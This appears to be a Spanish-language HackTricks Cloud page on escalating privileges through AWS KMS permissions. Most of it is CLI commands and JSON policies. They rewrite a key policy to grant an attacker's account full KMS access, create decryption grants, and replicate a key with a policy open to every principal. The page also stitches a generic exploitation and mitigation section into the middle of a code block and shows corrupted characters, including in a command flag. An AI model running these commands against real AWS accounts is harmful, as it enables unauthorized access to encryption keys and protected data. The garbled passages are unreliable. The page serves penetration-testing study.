# AWS - Escalaci√≥n de Privilegios en KMS

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## KMS

Para m√°s informaci√≥n sobre KMS, consulta:

{% content-ref url="../aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### `kms:ListKeys`,`kms:PutKeyPolicy`, (`kms:ListKeyPolicies`, `kms:GetKeyPolicy`)

Con estos permisos es posible **modificar los permisos de acceso a la clave** para que pueda ser utilizada por otras cuentas o incluso por cualquiera:

{% code overflow="wrap" %}
```bash
aws kms list-keys
aws kms list-key-policies --key-id <id> # Although only 1 max per key
aws kms get-key-policy --key-id <id> --policy-name <policy_name>
# AWS KMS keys can only have 1 policy, so you need to use the same name to overwrite the policy (the name is usually "default")
aws kms put-key-policy --key-id <id> --policy-name <policy_name> --policy file:///tmp/policy.json
```
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "kms:Create*",
        "kms:Describe*",
        "kms:Enable*",
        "kms:List*",
        "kms:Put*"
      ],
      "Resource": "*"
    }
  ]
}
```

# AWS KMS Privilege Escalation

## Escenario

Un usuario de AWS tiene permisos para realizar acciones espec√≠ficas en AWS KMS (Key Management Service). Estos permisos pueden ser abusados para escalar privilegios.

## Identificaci√≥n

Para identificar si un usuario tiene permisos de escalada de privilegios en AWS KMS, revise las pol√≠ticas de IAM asociadas al usuario en busca de acciones permitidas como `kms:Create*`, `kms:Describe*`, `kms:Enable*`, `kms:List*`, `kms:Put*`.

## Explotaci√≥n

Un atacante con permisos para crear y gestionar claves KMS puede:

1. Crear una nueva clave KMS.
2. Usar esa clave para cifrar y descifrar datos.
3. Potencialmente modificar pol√≠ticas de IAM para otorgarse m√°s permisos.

## Mitigaci√≥n

Para mitigar este vector de ataque:

1. Revise y limite los permisos de IAM relacionados con AWS KMS.
2. Aseg√∫rese de que solo los usuarios necesarios tengan permisos para gestionar claves KMS.
3. Utilice el principio de privilegio m√≠nimo.

## Herramientas

Herramientas como `aws_escalate.py` pueden ayudar a identificar y explotar vulnerabilidades de escalada de privilegios en AWS KMS.

## Referencias

Para m√°s informaci√≥n, consulte la documentaci√≥n oficial de AWS y gu√≠as sobre mejores pr√°cticas de seguridad para AWS KMS.
```json
{
"Version" : "2012-10-17",
"Id" : "key-consolepolicy-3",
"Statement" : [
{
"Sid" : "Enable IAM User Permissions",
"Effect" : "Allow",
"Principal" : {
"AWS" : "arn:aws:iam::<origin_account>:root"
},
"Action" : "kms:*",
"Resource" : "*"
},
{
"Sid" : "Allow all use",
"Effect" : "Allow",
"Principal" : {
"AWS" : "arn:aws:iam::<attackers_account>:root"
},
"Action" : [ "kms:*" ],
"Resource" : "*"
}
]
}
```
### `kms:CreateGrant`

**Permite a un principal usar una clave KMS:**
```bash
aws kms create-grant \
--key-id 1234abcd-12ab-34cd-56ef-1234567890ab \
--grantee-principal arn:aws:iam::123456789012:user/exampleUser \
--operations Decrypt
```
{% hint style="warning" %}
Un grant solo puede permitir ciertos tipos de operaciones: [https://docs.aws.amazon.com/kms/latest/developerguide/grants.html#terms-grant-operations](https://docs.aws.amazon.com/kms/latest/developerguide/grants.html#terms-grant-operations)
{% endhint %}

{% hint style="warning" %}
Tenga en cuenta que puede tardar un par de minutos para que KMS **permita al usuario usar la clave despu√©s de que se haya generado el grant**. Una vez que haya pasado ese tiempo, el principal puede usar la clave KMS sin necesidad de especificar nada.\
Sin embargo, si se necesita usar el grant inmediatamente [use un token de grant](https://docs.aws.amazon.com/kms/latest/developerguide/grant-manage.html#using-grant-token) (consulte el siguiente c√≥digo).\
Para [**m√°s informaci√≥n lea esto**](https://docs.aws.amazon.com/kms/latest/developerguide/grant-manage.html#using-grant-token).
{% endhint %}
```bash
# Use the grant token in a request
aws kms generate-data-key \
--key-id 1234abcd-12ab-34cd-56ef-1234567890ab \
‚Äì-key-spec AES_256 \
--grant-tokens $token
```
Tenga en cuenta que es posible listar la concesi√≥n de claves con:
```bash
aws kms list-grants --key-id <value>
```
### `kms:CreateKey`, `kms:ReplicateKey`

Con estos permisos es posible replicar una clave KMS habilitada para m√∫ltiples regiones en una regi√≥n diferente con una pol√≠tica diferente.

Por lo tanto, un atacante podr√≠a abusar de esto para obtener privesc en su acceso a la clave y usarla

{% code overflow="wrap" %}
```bash
aws kms replicate-key --key-id mrk-c10357313a644d69b4b28b88523ef20c --replica-region eu-west-3 --bypass-policy-lockout-safety-check --policy file:///tmp/policy.yml

{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
### `kms:Decrypt`

Este permiso permite usar una clave para desencriptar informaci√≥n.\
Para m√°s informaci√≥n, consulta:

{% content-ref url="../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
